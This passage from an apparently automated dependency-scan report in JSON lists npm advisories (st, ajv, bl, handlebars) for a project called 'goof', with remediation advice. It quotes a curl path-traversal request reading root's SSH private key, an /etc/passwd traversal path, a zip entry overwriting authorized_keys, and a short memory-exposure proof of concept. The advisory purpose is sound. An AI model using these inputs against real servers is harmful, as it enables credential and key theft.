          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Directory Traversal",
          "id": "npm:st:20140206",
          "desc": "## Overview\r\nVersions prior to 0.2.5 did not properly prevent path traversal. Literal dots in a path were resolved out, but url encoded dots were not. Thus, a request like ``` /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd ``` would leak sensitive files and data from the server.\r\n\r\nAs of version 0.2.5, any ```'/../'``` in the request path, urlencoded or not, will be replaced with ```'/'```. If your application depends on url traversal, then you are encouraged to please refactor so that you do not depend on having ```..``` in url paths, as this tends to expose data that you may be surprised to be exposing.\r\n\r\n## Details\r\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\r\n\r\nDirectory Traversal vulnerabilities can be generally divided into two types:\r\n\r\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\r\n\r\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\r\n\r\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\r\n\r\n```\r\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\r\n```\r\n**Note** `%2e` is the URL encoded version of `.` (dot).\r\n\r\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \r\n\r\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\r\n\r\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\r\n\r\n```\r\n2018-04-15 22:04:29 .....           19           19  good.txt\r\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\r\n```\r\n\r\n\r\n## Remediation\r\nUpgrade to version 0.2.5 or greater.\r\n\r\n## References\r\n- https://github.com/isaacs/st#security-status\r\n- http://blog.npmjs.org/post/80277229932/newly-paranoid-maintainers",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [\n    \"SNYK-JS-ST-10012\"\n  ],\n  \"creationTime\": \"2014-02-06T07:33:48Z\",\n  \"credit\": [\n    \"Charlie Somerville\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\r\\nVersions prior to 0.2.5 did not properly prevent path traversal. Literal dots in a path were resolved out, but url encoded dots were not. Thus, a request like ``` /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd ``` would leak sensitive files and data from the server.\\r\\n\\r\\nAs of version 0.2.5, any ```'/../'``` in the request path, urlencoded or not, will be replaced with ```'/'```. If your application depends on url traversal, then you are encouraged to please refactor so that you do not depend on having ```..``` in url paths, as this tends to expose data that you may be surprised to be exposing.\\r\\n\\r\\n## Details\\r\\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \\\"dot-dot-slash (../)\\\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\\r\\n\\r\\nDirectory Traversal vulnerabilities can be generally divided into two types:\\r\\n\\r\\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\\r\\n\\r\\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\\r\\n\\r\\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\\r\\n\\r\\n```\\r\\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\\r\\n```\\r\\n**Note** `%2e` is the URL encoded version of `.` (dot).\\r\\n\\r\\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \\r\\n\\r\\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\\r\\n\\r\\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\\r\\n\\r\\n```\\r\\n2018-04-15 22:04:29 .....           19           19  good.txt\\r\\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\\r\\n```\\r\\n\\r\\n\\r\\n## Remediation\\r\\nUpgrade to version 0.2.5 or greater.\\r\\n\\r\\n## References\\r\\n- https://github.com/isaacs/st#security-status\\r\\n- http://blog.npmjs.org/post/80277229932/newly-paranoid-maintainers\",\n  \"disclosureTime\": \"2014-02-06T07:33:48Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"0.2.5\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"st.js\",\n        \"functionName\": \"Mount.prototype.getPath\"\n      },\n      \"version\": [\n        \">0.0.1 <0.2.5\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"st.js\",\n        \"functionName\": \"Mount.prototype.getPath\"\n      },\n      \"version\": [\n        \">0.0.1 <0.2.5\"\n      ]\n    }\n  ],\n  \"id\": \"npm:st:20140206\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-ST-10012\"\n    ],\n    \"CVE\": [\n      \"CVE-2014-3744\"\n    ],\n    \"CWE\": [\n      \"CWE-22\"\n    ],\n    \"GHSA\": [\n      \"GHSA-69rr-wvh9-6c4q\"\n    ],\n    \"NSP\": [\n      \"36\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-22T17:02:08.035692Z\",\n  \"moduleName\": \"st\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"st\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:st:20140206:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.736720Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/st/20140206/st-20140206_0_0_6b54ce2d2fb912eadd31e2c25c65456d2c8666e1.patch\"\n      ],\n      \"version\": \"<0.2.5 >0.1.4\"\n    }\n  ],\n  \"proprietary\": false,\n  \"publicationTime\": \"2014-02-06T07:33:48Z\",\n  \"references\": [\n    {\n      \"title\": \"BLOG.NPMJS.ORG\",\n      \"url\": \"http://blog.npmjs.org/post/80277229932/newly-paranoid-maintainers\"\n    },\n    {\n      \"title\": \"GITHUB.COM\",\n      \"url\": \"https://github.com/isaacs/st%23security-status\"\n    },\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/isaacs/st/commit/6b54ce2d2fb912eadd31e2c25c65456d2c8666e1\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.2.5\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Directory Traversal\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"st@0.2.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"st@0.2.5\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": true,\n  \"name\": \"st\",\n  \"version\": \"0.2.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , st@0.2.4 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "601"
            ],
            "cveid": [
              "2017-16224"
            ],
            "ghsaid": [
              "72fg-jqhx-c68p"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Open Redirect",
          "id": "npm:st:20171013",
          "desc": "## Overview\n[`st`](https://www.npmjs.com/package/st) is a module for serving static files.\n\nAffected versions of this package are vulnerable to Open Redirect. A malicious user could send a specially crafted request, which would automatically redirect the request to another domain, controlled by the attacker.\n\n**Note:**  `st` will only redirect if requests are served from the root(`/`) and not from a subdirectory\n\n## References\n- [GitHub Commit](https://github.com/isaacs/st/commit/579960c629f12a27428e2da84c54f517e37b0a16)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N/E:H/RL:O/RC:C\",\n  \"alternativeIds\": [\n    \"SNYK-JS-ST-10820\"\n  ],\n  \"creationTime\": \"2017-10-13T18:54:37Z\",\n  \"credit\": [\n    \"Xin Gao\"\n  ],\n  \"cvssScore\": 4.3,\n  \"description\": \"## Overview\\n[`st`](https://www.npmjs.com/package/st) is a module for serving static files.\\n\\nAffected versions of this package are vulnerable to Open Redirect. A malicious user could send a specially crafted request, which would automatically redirect the request to another domain, controlled by the attacker.\\n\\n**Note:**  `st` will only redirect if requests are served from the root(`/`) and not from a subdirectory\\n\\n## References\\n- [GitHub Commit](https://github.com/isaacs/st/commit/579960c629f12a27428e2da84c54f517e37b0a16)\\n\",\n  \"disclosureTime\": \"2017-10-13T23:01:42Z\",\n  \"exploit\": \"High\",\n  \"fixedIn\": [\n    \"1.2.2\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"npm:st:20171013\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-ST-10820\"\n    ],\n    \"CVE\": [\n      \"CVE-2017-16224\"\n    ],\n    \"CWE\": [\n      \"CWE-601\"\n    ],\n    \"GHSA\": [\n      \"GHSA-72fg-jqhx-c68p\"\n    ],\n    \"NSP\": [\n      \"547\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-22T17:02:11.781554Z\",\n  \"moduleName\": \"st\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"st\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2017-10-15T07:10:40.818000Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/isaacs/st/commit/579960c629f12a27428e2da84c54f517e37b0a16\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<1.2.2\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Open Redirect\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"st@0.2.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"st@1.2.2\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"st\",\n  \"version\": \"0.2.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , st@0.2.4 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        }
      ],
      "sha256": "87bd78db3c1687e098b5833ccc7c4f4b4a922f73527901a8988d6b34407d28e9"
    }
  ],
  "passthrough": {
    "snyk_metadata": {
      "ok": false,
      "dependencyCount": 565,
      "org": "ejaronne",
      "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.22.1\nignore: {}\npatch: {}\n",
      "isPrivate": true,
      "licensesPolicy": {
        "severities": {},
        "orgLicenseRules": {
          "AGPL-1.0": {
            "licenseType": "AGPL-1.0",
            "severity": "high",
            "instructions": ""
          },
          "AGPL-3.0": {
            "licenseType": "AGPL-3.0",
            "severity": "high",
            "instructions": ""
          },
          "Artistic-1.0": {
            "licenseType": "Artistic-1.0",
            "severity": "medium",
            "instructions": ""
          },
          "Artistic-2.0": {
            "licenseType": "Artistic-2.0",
            "severity": "medium",
            "instructions": ""
          },
          "CDDL-1.0": {
            "licenseType": "CDDL-1.0",
            "severity": "medium",
            "instructions": ""
          },
          "CPOL-1.02": {
            "licenseType": "CPOL-1.02",
            "severity": "high",
            "instructions": ""
          },
          "EPL-1.0": {
            "licenseType": "EPL-1.0",
            "severity": "medium",
            "instructions": ""
          },
          "GPL-2.0": {
            "licenseType": "GPL-2.0",
            "severity": "high",
            "instructions": ""
          },
          "GPL-3.0": {
            "licenseType": "GPL-3.0",
            "severity": "high",
            "instructions": ""
          },
          "LGPL-2.0": {
            "licenseType": "LGPL-2.0",
            "severity": "medium",
            "instructions": ""
          },
          "LGPL-2.1": {
            "licenseType": "LGPL-2.1",
            "severity": "medium",
            "instructions": ""
          },
          "LGPL-3.0": {
            "licenseType": "LGPL-3.0",
            "severity": "medium",
            "instructions": ""
          },
          "MPL-1.1": {
            "licenseType": "MPL-1.1",
            "severity": "medium",
            "instructions": ""
          },
          "MPL-2.0": {
            "licenseType": "MPL-2.0",
            "severity": "medium",
            "instructions": ""
          },
          "MS-RL": {
            "licenseType": "MS-RL",
            "severity": "medium",
            "instructions": ""
          },
          "SimPL-2.0": {
            "licenseType": "SimPL-2.0",
            "severity": "high",
            "instructions": ""
          }
        }
      },
      "packageManager": "npm",
      "ignoreSettings": null,
      "summary": "379 vulnerable dependency paths",
      "remediation": {
        "unresolved": [
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "alternativeIds": [],
            "creationTime": "2020-07-16T08:19:48.462528Z",
            "credit": [
              "Unknown"
            ],
            "cvssScore": 8.1,
            "description": "## Overview\n[ajv](https://www.npmjs.com/package/ajv) is an Another JSON Schema Validator\n\nAffected versions of this package are vulnerable to Prototype Pollution. A carefully crafted JSON schema could be provided that allows execution of other code by prototype pollution. (While untrusted schemas are recommended against, the worst case of an untrusted schema should be a denial of service, not execution of code.)\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `ajv` to version 6.12.3 or higher.\n## References\n- [HackerOne Report](https://hackerone.com/bugs?subject=user&report_id=894259)\n",
            "disclosureTime": "2020-07-16T08:14:41Z",
            "exploit": "Not Defined",
            "fixedIn": [
              "6.12.3"
            ],
            "functions": [],
            "functions_new": [],
            "id": "SNYK-JS-AJV-584908",
            "identifiers": {
              "CVE": [
                "CVE-2020-15366"
              ],
              "CWE": [
                "CWE-400"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2020-07-20T12:40:09.463832Z",
            "moduleName": "ajv",
            "packageManager": "npm",
            "packageName": "ajv",
            "patches": [],
            "proprietary": false,
            "publicationTime": "2020-07-16T13:58:04Z",
            "references": [
              {
                "title": "HackerOne Report",
                "url": "https://hackerone.com/bugs?subject=user&report_id=894259"
              }
            ],
            "semver": {
              "vulnerable": [
                "<6.12.3"
              ]
            },
            "severity": "high",
            "socialTrendAlert": false,
            "title": "Prototype Pollution",
            "from": [
              "goof@1.0.1",
              "tap@11.1.5",
              "coveralls@3.0.9",
              "request@2.88.0",
              "har-validator@5.1.3",
              "ajv@6.10.2"
            ],
            "upgradePath": [
              false,
              "tap@11.1.5",
              "coveralls@3.0.9",
              "request@2.88.0",
              "har-validator@5.1.3",
              "ajv@6.12.3"
            ],
            "isUpgradable": true,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "ajv",
            "version": "6.10.2",
            "severityWithCritical": "high"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L/E:P",
            "alternativeIds": [],
            "creationTime": "2020-08-28T12:18:44.906258Z",
            "credit": [
              "chalker"
            ],
            "cvssScore": 7.7,
            "description": "## Overview\n[bl](https://github.com/rvagg/bl) is a library that allows you to collect buffers and access with a standard readable buffer interface.\n\nAffected versions of this package are vulnerable to Remote Memory Exposure. If user input ends up in `consume()` argument and can become negative, BufferList state can be corrupted, tricking it into exposing uninitialized memory via regular `.slice()` calls.\r\n\r\n### PoC by chalker\r\n```\r\nconst { BufferList } = require('bl')\r\nconst secret = require('crypto').randomBytes(256)\r\nfor (let i = 0; i < 1e6; i++) {\r\n  const clone = Buffer.from(secret)\r\n  const bl = new BufferList()\r\n  bl.append(Buffer.from('a'))\r\n  bl.consume(-1024)\r\n  const buf = bl.slice(1)\r\n  if (buf.indexOf(clone) !== -1) {\r\n    console.error(`Match (at ${i})`, buf)\r\n  }\r\n}\r\n```\n## Remediation\nUpgrade `bl` to version 2.2.1, 3.0.1, 4.0.3, 1.2.3 or higher.\n## References\n- [Github Commit](https://github.com/rvagg/bl/commit/8a8c13c880e2bef519133ea43e0e9b78b5d0c91e)\n- [Github Commit](https://github.com/rvagg/bl/commit/d3e240e3b8ba4048d3c76ef5fb9dd1f8872d3190)\n- [Github Commit](https://github.com/rvagg/bl/commit/dacc4ac7d5fcd6201bcf26fbd886951be9537466)\n- [GitHub Commit](https://github.com/rvagg/bl/commit/0bd87ec97be399b129fc62feff2943ffa21bcc00)\n- [HackerOne Report](https://hackerone.com/reports/966347)\n",
            "disclosureTime": "2020-08-27T15:16:42Z",
            "exploit": "Proof of Concept",
            "fixedIn": [
              "2.2.1",
              "3.0.1",
              "4.0.3",
              "1.2.3"
            ],
            "functions": [],
            "functions_new": [],
            "id": "SNYK-JS-BL-608877",
            "identifiers": {
              "CVE": [
                "CVE-2020-8244"
              ],
              "CWE": [
                "CWE-9"
              ],
              "GHSA": [
                "GHSA-pp7h-53gx-mx7r"
              ],
              "NSP": [
                "1555"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2021-08-08T13:56:54.899052Z",
            "moduleName": "bl",
            "packageManager": "npm",
            "packageName": "bl",
            "patches": [],
            "proprietary": false,
            "publicationTime": "2020-08-28T12:18:48Z",
            "references": [
              {
                "title": "Github Commit",
                "url": "https://github.com/rvagg/bl/commit/8a8c13c880e2bef519133ea43e0e9b78b5d0c91e"
              },
              {
                "title": "Github Commit",
                "url": "https://github.com/rvagg/bl/commit/d3e240e3b8ba4048d3c76ef5fb9dd1f8872d3190"
              },
              {
                "title": "Github Commit",
                "url": "https://github.com/rvagg/bl/commit/dacc4ac7d5fcd6201bcf26fbd886951be9537466"
              },
              {
                "title": "GitHub Commit",
                "url": "https://github.com/rvagg/bl/commit/0bd87ec97be399b129fc62feff2943ffa21bcc00"
              },
              {
                "title": "HackerOne Report",
                "url": "https://hackerone.com/reports/966347"
              }
            ],
            "semver": {
              "vulnerable": [
                ">=2.2.0 <2.2.1",
                ">=3.0.0 <3.0.1",
                ">=4.0.0 <4.0.3",
                "<1.2.3"
              ]
            },
            "severity": "high",
            "socialTrendAlert": false,
            "title": "Remote Memory Exposure",
            "from": [
              "goof@1.0.1",
              "mongodb@3.5.9",
              "bl@2.2.0"
            ],
            "upgradePath": [
              false,
              "mongodb@3.5.9",
              "bl@2.2.1"
            ],
            "isUpgradable": true,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "bl",
            "version": "2.2.0",
            "severityWithCritical": "high"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "alternativeIds": [],
            "creationTime": "2019-02-14T16:46:18.024227Z",
            "credit": [
              "Mahmoud Gamal",
              "Matias Lang"
            ],
            "cvssScore": 7.3,
            "description": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Prototype Pollution. Templates may alter an Objects' prototype, thus allowing an attacker to execute arbitrary code on the server.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `handlebars` to version 4.0.14, 4.1.2 or higher.\n## References\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/7372d4e9dffc9d70c09671aa28b9392a1577fd86)\n- [GitHub Issue](https://github.com/wycats/handlebars.js/issues/1495)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/755)\n",
            "disclosureTime": "2018-12-28T20:34:57Z",
            "exploit": "Not Defined",
            "fixedIn": [
              "4.0.14",
              "4.1.2"
            ],
            "functions": [
              {
                "functionId": {
                  "className": null,
                  "filePath": "dist/amd/handlebars/compiler/javascript-compiler.js",
                  "functionName": "JavaScriptCompiler.prototype.nameLookup"
                },
                "version": [
                  ">1.0.12 <4.0.13"
                ]
              },
              {
                "functionId": {
                  "className": null,
                  "filePath": "dist/handlebars.js",
                  "functionName": "JavaScriptCompiler.Handlebars.JavaScriptCompiler"
                },
                "version": [
                  ">=1.0.6 <=1.0.12"
                ]
              }
            ],
            "functions_new": [
              {
                "functionId": {
                  "filePath": "dist/amd/handlebars/compiler/javascript-compiler.js",
                  "functionName": "JavaScriptCompiler.prototype.nameLookup"
                },
                "version": [
                  ">1.0.12 <4.0.13"
                ]
              },
              {
                "functionId": {
                  "filePath": "dist/handlebars.js",
                  "functionName": "JavaScriptCompiler.Handlebars.JavaScriptCompiler"
                },
                "version": [
                  ">=1.0.6 <=1.0.12"
                ]
              }
            ],
            "id": "SNYK-JS-HANDLEBARS-173692",
            "identifiers": {
              "CVE": [],
              "CWE": [
                "CWE-471"
              ],
              "GHSA": [
                "GHSA-6r5x-hmgg-7h53"
              ],
              "NSP": [
                "755"
              ]
            },
            "language": "js",
            "malicious": false,
            "modificationTime": "2020-12-14T14:40:53.284737Z",
            "moduleName": "handlebars",
            "packageManager": "npm",
            "packageName": "handlebars",
            "patches": [],
            "proprietary": false,
            "publicationTime": "2019-02-14T17:52:50Z",
            "references": [
              {
                "title": "GitHub Commit",
                "url": "https://github.com/wycats/handlebars.js/commit/7372d4e9dffc9d70c09671aa28b9392a1577fd86"
              },
              {
                "title": "GitHub Issue",
                "url": "https://github.com/wycats/handlebars.js/issues/1495"
              },
              {
                "title": "NPM Security Advisory",
                "url": "https://www.npmjs.com/advisories/755"
              }
            ],
            "semver": {
              "vulnerable": [
                "<4.0.14",
                ">=4.1.0 <4.1.2"
              ]
            },
            "severity": "high",
            "socialTrendAlert": false,
            "title": "Prototype Pollution",
            "from": [
              "goof@1.0.1",
              "tap@11.1.5",
              "nyc@11.9.0",
              "istanbul-reports@1.4.0",
              "handlebars@4.0.11"
            ],
            "upgradePath": [
              false,
              "tap@11.1.5",
              "nyc@11.9.0",
              "istanbul-reports@1.4.0",
              "handlebars@4.0.14"
            ],
            "isUpgradable": true,
            "isPatchable": false,
            "isPinnable": false,
            "isRuntime": false,
            "name": "handlebars",
            "version": "4.0.11",
            "severityWithCritical": "high"
          },
          {
            "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "alternativeIds": [],
